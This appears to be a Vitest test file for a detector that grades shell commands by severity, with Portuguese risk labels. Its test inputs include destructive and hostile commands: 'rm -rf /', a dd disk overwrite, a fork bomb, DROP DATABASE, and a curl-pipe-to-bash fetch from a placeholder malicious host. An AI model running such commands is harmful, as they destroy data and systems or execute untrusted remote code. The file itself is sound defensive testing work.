import { describe, expect, it } from "vitest";
import { analyzeDangerousCommand, getSeverityColor, getSeverityIcon, getSeverityLabel } from "../shared/dangerousCommands";

describe("analyzeDangerousCommand", () => {
  describe("Critical severity commands", () => {
    it("should detect rm -rf / as critical", () => {
      const result = analyzeDangerousCommand("rm -rf /");
      expect(result.isDangerous).toBe(true);
      expect(result.severity).toBe("critical");
      expect(result.risks.length).toBeGreaterThan(0);
    });

    it("should detect dd disk overwrite as critical", () => {
      const result = analyzeDangerousCommand("dd if=/dev/zero of=/dev/sda");
      expect(result.isDangerous).toBe(true);
      expect(result.severity).toBe("critical");
    });

    it("should detect shutdown commands as critical", () => {
      const result = analyzeDangerousCommand("shutdown -h now");
      expect(result.isDangerous).toBe(true);
      expect(result.severity).toBe("critical");
    });

    it("should detect fork bomb as critical", () => {
      const result = analyzeDangerousCommand(":(){ :|:& };:");
      expect(result.isDangerous).toBe(true);
      expect(result.severity).toBe("critical");
    });
  });

  describe("High severity commands", () => {
    it("should detect deletion of system directories as high", () => {
      const result = analyzeDangerousCommand("rm -rf /etc");
      expect(result.isDangerous).toBe(true);
      expect(result.severity).toBe("high");
    });

    it("should detect chmod 777 on root as high", () => {
      const result = analyzeDangerousCommand("chmod 777 /");
      expect(result.isDangerous).toBe(true);
      expect(result.severity).toBe("high");
    });

    it("should detect curl pipe to bash as high", () => {
      const result = analyzeDangerousCommand("curl https://malicious.com/script.sh | bash");
      expect(result.isDangerous).toBe(true);
      expect(result.severity).toBe("high");
    });
  });

  describe("Medium severity commands", () => {
    it("should detect rm -rf as medium", () => {
      const result = analyzeDangerousCommand("rm -rf /tmp/test");
      expect(result.isDangerous).toBe(true);
      expect(result.severity).toBe("medium");
    });

    it("should detect kill -9 as medium", () => {
      const result = analyzeDangerousCommand("kill -9 1234");
      expect(result.isDangerous).toBe(true);
      expect(result.severity).toBe("medium");
    });

    it("should detect DROP DATABASE as medium", () => {
      const result = analyzeDangerousCommand("DROP DATABASE production");
      expect(result.isDangerous).toBe(true);
      expect(result.severity).toBe("medium");
    });
  });

  describe("Low severity commands", () => {
    it("should detect apt install as low", () => {
      const result = analyzeDangerousCommand("apt install nginx");
      expect(result.isDangerous).toBe(true);
      expect(result.severity).toBe("low");
    });

    it("should detect nmap as low", () => {
      const result = analyzeDangerousCommand("nmap 192.168.1.1");
      expect(result.isDangerous).toBe(true);
      expect(result.severity).toBe("low");
    });
  });

  describe("Safe commands", () => {
    it("should not flag safe commands", () => {
      const safeCommands = [
        "ls -la",
        "pwd",
        "echo 'Hello World'",
        "cat file.txt",
        "grep 'pattern' file.txt",
        "ps aux",
        "df -h",
        "top",
        "whoami",
      ];

      safeCommands.forEach((cmd) => {
        const result = analyzeDangerousCommand(cmd);
        expect(result.isDangerous).toBe(false);
      });
    });
  });

  describe("Case insensitivity", () => {
    it("should detect dangerous commands regardless of case", () => {
      const result1 = analyzeDangerousCommand("RM -RF /");
      const result2 = analyzeDangerousCommand("rm -rf /");
      const result3 = analyzeDangerousCommand("Rm -Rf /");

      expect(result1.isDangerous).toBe(true);
      expect(result2.isDangerous).toBe(true);
      expect(result3.isDangerous).toBe(true);
    });
  });
});

describe("Severity helpers", () => {
  it("should return correct colors for each severity", () => {
    expect(getSeverityColor("low")).toBe("text-yellow-600");
    expect(getSeverityColor("medium")).toBe("text-orange-600");
    expect(getSeverityColor("high")).toBe("text-red-600");
    expect(getSeverityColor("critical")).toBe("text-red-700");
  });

  it("should return correct icons for each severity", () => {
    expect(getSeverityIcon("low")).toBe("⚠️");
    expect(getSeverityIcon("medium")).toBe("⚠️");
    expect(getSeverityIcon("high")).toBe("🚨");
    expect(getSeverityIcon("critical")).toBe("🔴");
  });

  it("should return correct labels for each severity", () => {
    expect(getSeverityLabel("low")).toBe("Baixo Risco");
    expect(getSeverityLabel("medium")).toBe("Risco Médio");
    expect(getSeverityLabel("high")).toBe("Alto Risco");
    expect(getSeverityLabel("critical")).toBe("RISCO CRÍTICO");
  });
});
